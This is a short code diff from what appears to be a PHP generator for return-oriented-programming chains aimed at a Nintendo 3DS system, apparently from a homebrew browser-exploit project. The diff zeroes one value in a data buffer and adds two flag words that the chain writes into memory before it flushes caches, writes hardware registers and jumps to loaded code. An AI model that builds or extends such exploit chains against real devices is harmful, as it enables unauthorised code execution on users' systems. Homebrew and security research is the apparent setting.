@@ -1324,7 +1324,7 @@ function generateropchain_type2()
 	ropgen_callfunc($LINEAR_CODETMPBUF, 0x10000, 0x0, 0x0, $POPPC, $GSP_FLUSHDCACHE);//Flush the data-cache for the loaded code.
 
 	$databuf = array();
-	$databuf[0] = 0x18b52000;//End address of the LINEAR memory-region, where free memory is available at the physical-memory located here.
+	$databuf[0] = 0x0;
 	$databuf[1] = $THROW_FATALERR;
 	$databuf[2] = $SRVPORT_HANDLEADR;
 	$databuf[3] = $SRV_REFCNT;
@@ -1342,7 +1342,9 @@ function generateropchain_type2()
 	$databuf[15] = $GSP_WRITEHWREGS;
 	$databuf[16] = $APT_PrepareToDoApplicationJump;
 	$databuf[17] = $APT_DoApplicationJump;
-	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 18*4);
+	$databuf[18] = 0x0;//flags
+	$databuf[19] = 0x0;
+	ropgen_writeregdata_wrap($LINEAR_TMPBUF, $databuf, 0, 20*4);
 
 	$ROPCHAIN.= genu32_unicode($POPLRPC);
 	$ROPCHAIN.= genu32_unicode($ROP_POP_R0R6PC);
